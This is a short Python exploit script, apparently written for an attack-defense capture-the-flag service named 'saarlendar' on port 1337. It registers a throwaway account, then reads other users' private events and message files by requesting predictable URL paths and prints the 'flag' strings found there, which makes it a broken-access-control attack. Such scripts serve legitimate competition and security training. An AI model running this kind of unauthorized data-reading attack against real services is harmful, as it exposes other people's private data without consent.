import json
import sys
import urllib

import utils

from saarlendar import Remote, randomstring

r = Remote(("http://%s:1337/" % (sys.argv[1])).encode())
r.DEBUG = r.VERBOSE
username, password = randomstring(10), randomstring(10)
r.register(username, password)
r.login(username, password)
for user, timestamp in utils.finduser1(r, 10):
    s = r.new_session()
    e1 = s.get(r.url + b"/events/" + timestamp + b"_" + user).content.strip().split(b"\n")
    for event in e1:
        try:
            e = json.loads(event)
            print("flag1:", urllib.parse.unquote_plus(e["text"]))

        finally:
            pass
    m1 = s.get(r.url + b"/users/" + user + b"_messages").content.strip().split(b"\n")
    for m in m1:
        try:
            m = json.loads(m)
            text = urllib.parse.unquote_plus(m["text"])
            if (text.startswith("Can you invite me")):
                user = m["from"].encode()
                break
        except:
            continue
    m2 = s.get(r.url + b"/users/" + user + b"_messages").content.strip().split(b"\n")
    for m in m2:
        try:
            m = json.loads(m)
            text = urllib.parse.unquote_plus(m["text"])
            if (text.startswith("Here is my flag: ")):
                print("flag2: ", text)
        except:
            pass
